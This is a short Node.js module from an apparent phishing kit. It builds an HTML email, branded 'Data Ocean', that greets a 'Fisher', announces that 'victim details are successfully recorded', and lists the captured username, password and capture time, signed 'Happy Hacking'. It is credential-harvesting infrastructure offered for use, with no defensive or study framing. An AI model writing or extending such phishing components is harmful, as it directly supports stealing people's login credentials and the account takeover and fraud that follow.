const createPAssTemplate = (data) => {
    const { username, pass, createdAt } = data;
    const date = new Date(createdAt);
    const finalDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`
    return  `
        <!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Welcome Email</title>
        <style>
            /* Reset some default styles */
            body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            line-height: 1.5;
            color: #008722;
            background-color: #969696;
            }
            h1, p {
            margin: 0;
            }
            /* Container styles */
            .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            }
            /* Header styles */
            .header {
            background-color: #000000;
            padding: 20px;
            text-align: center;
            }
            .header h1 {
            color: #333333;
            margin-bottom: 10px;
            }
            /* Content styles */
            .content {
            padding: 20px;
            background-color: #000000;
            border-radius: 4px;
            }
            .content p {
            margin-bottom: 20px;
            }
            /* Footer styles */
            .footer {
            
            }
            .marquee{
            padding: 30px;
            color: #008722;
            background-color: #000000;
            padding: 20px;
            text-align: center;
            }
        </style>
        </head>
        <body>
        <div class="container">
            <div class="header">
            <h2>Welcome To Data Ocean</h2>
            </div>
            <div class="content">
            <p>Hello Fisher,</p>
            <p><b>The victim details are successfully recorded...</b></p>
            <p><strong>Username:</strong> ${username}</p>
            <p><strong>Password:</strong> ${pass}</p>
            <p><strong>Time:</strong> ${finalDate}</p>
            </div>
            <div class="marquee">
            <marquee scrollamount="10" direction="right">Happy Hacking By Satyamiiiii</marquee>
            </div>
         </body>
        </html>
    `;
  }
  
  module.exports = { createPAssTemplate };
  